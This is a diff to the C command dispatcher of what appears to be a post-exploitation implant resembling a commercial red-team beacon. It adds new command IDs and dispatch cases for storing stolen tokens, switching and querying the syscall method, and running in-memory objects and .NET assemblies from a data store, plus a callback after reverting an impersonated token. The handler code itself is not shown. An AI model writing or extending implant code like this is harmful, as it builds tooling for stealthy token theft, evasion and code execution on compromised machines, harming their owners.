@@ -6,6 +6,7 @@
 #include "build.h"
 #include "parse.h"
 #include "bformat.h"
+#include "datastore.h"
 
 #define COMMAND_SPAWN          0x01
 #define COMMAND_SHELL          0x02
@@ -109,6 +110,12 @@
 #define COMMAND_INLINE_EXECUTE_OBJECT 0x64
 #define COMMAND_JOB_REGISTER_MSGMODE 0x65
 #define COMMAND_LSOCKET_BIND_LOCALHOST 0x66
+#define COMMAND_TOKEN_STORE            105
+#define COMMAND_CHANGE_SYSCALL_METHOD  112
+#define COMMAND_QUERY_SYSCALL_METHOD   113
+#define COMMAND_DATA_STORE             115
+#define COMMAND_DATA_STORE_INLINE_EXECUTE_OBJECT 116
+#define COMMAND_DATA_STORE_EXECUTE_ASSEMBLY 117
 
 typedef struct {
 	unsigned int   type;
@@ -191,6 +198,7 @@ void process_message(unsigned int type, char * buffer, int length) {
 		break;
 	case COMMAND_TOKEN_REV2SELF:
 		command_rev2self();
+		command_shell_callback("", 0, CALLBACK_TOKEN_REV2SELF);
 		break;
 	case COMMAND_STEAL_TOKEN:
 		command_steal_token(buffer, length, command_shell_callback);
@@ -416,6 +424,24 @@ void process_message(unsigned int type, char * buffer, int length) {
 		break;
 	case COMMAND_LSOCKET_BIND_LOCALHOST:
 		command_socket_bind(buffer, length, 0x0100007f);
+		break;
+	case COMMAND_TOKEN_STORE:
+		command_token_store(buffer, length, command_shell_callback);
+		break;
+	case COMMAND_CHANGE_SYSCALL_METHOD:
+		command_syscall_method_change(buffer, length, command_shell_callback);
+		break;
+	case COMMAND_QUERY_SYSCALL_METHOD:
+		command_syscall_method_query(command_shell_callback);
+		break;
+	case COMMAND_DATA_STORE:
+		command_data_store(buffer, length, command_shell_callback);
+		break;
+	case COMMAND_DATA_STORE_INLINE_EXECUTE_OBJECT:
+		command_data_store_inline_execute(buffer, length);
+		break;
+	case COMMAND_DATA_STORE_EXECUTE_ASSEMBLY:
+		command_data_store_execute_assembly(buffer, length, TRUE, TRUE);
 		break;
 	}
 }
